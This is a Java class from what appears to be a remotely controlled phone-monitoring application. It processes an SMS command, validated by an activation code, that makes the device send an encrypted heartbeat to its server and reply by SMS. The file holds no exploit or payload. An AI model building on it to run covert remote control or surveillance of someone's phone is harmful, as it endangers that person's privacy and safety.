package com.vvt.remotecommandmanager.processor.miscellaneous;

import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.DeliveryRequest;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class RequestHeartbeatProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RequestHeartbeatProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private LicenseInfo mLicenseInfo;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private DataDelivery mDataDelivery;
	private CountDownLatch waitForResponseLatch;
	private StringBuilder mReplyMessageBuilder;
	
	public RequestHeartbeatProcessor(AppContext appContext, DataDelivery dataDelivery,
			FxEventRepository eventRepository, LicenseInfo licenseInfo) {
		super(appContext, eventRepository);
		mDataDelivery = dataDelivery;
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData) throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		waitForResponseLatch = new CountDownLatch(1);
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		DeliveryRequest request = new DeliveryRequest();
		request.setCallerID(100);
		request.setCommandData(new com.vvt.phoenix.prot.command.SendHeartbeat());
		request.setDeliveryListener(mDeliveryListener);
		request.setDeliveryRequestType(DeliveryRequestType.REQUEST_TYPE_NEW);
		request.setRequestPriority(PriorityRequest.PRIORITY_NORMAL);
		request.setDataProviderType(DataProviderType.DATA_PROVIDER_TYPE_NONE);
		request.setMaxRetryCount(1);
		request.setDelayTime(1000);
		request.setIsRequireCompression(true);
		request.setIsRequireEncryption(true);
		
		 
		mDataDelivery.deliver(request);
			
		//Block the thread and wait till onSuccess or onError called.
		try { waitForResponseLatch.await(); } catch (InterruptedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
			
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}
	
	DeliveryListener mDeliveryListener = new DeliveryListener() {
		@Override
		public void onFinish(DeliveryResponse paramDeliveryResponse) {
			if(LOGD) FxLog.d(TAG, String.format("paramDeliveryResponse : %s, getStatusCode : %s", paramDeliveryResponse,paramDeliveryResponse.getStatusCode()));
			if(paramDeliveryResponse.isSuccess()) {
				mReplyMessage.setIsSuccess(true);
				mReplyMessageBuilder.append(MessageManager.REQUEST_HEART_BEAT_SUCCESS);
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				waitForResponseLatch.countDown();	
			}
			else {
				mReplyMessage.setIsSuccess(false);
				mReplyMessageBuilder.append(RemoteCommandUtil.getErrorMessage(paramDeliveryResponse));
				mReplyMessage.setMessage(mReplyMessageBuilder.toString());
				waitForResponseLatch.countDown();
			}
		}

		@Override
		public void onProgress(DeliveryResponse paramDeliveryResponse) { }
	};
	

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
	
/**=============================== for test =====================================**/
	
	/**TODO : delete when release.
	 * FOR TEST ONLY!!!
	 * @return
	 */
	public boolean isfinish() {
		if(!mReplyMessage.getMessage().equals("unknown")) {
			return true;
		}
		return false;
	}
	
	/**TODO : delete when release.
	 * FOR TEST ONLY!!!
	 * @return
	 */
	public String getMessage() {
		
		return mReplyMessage.getMessage();
	}

}
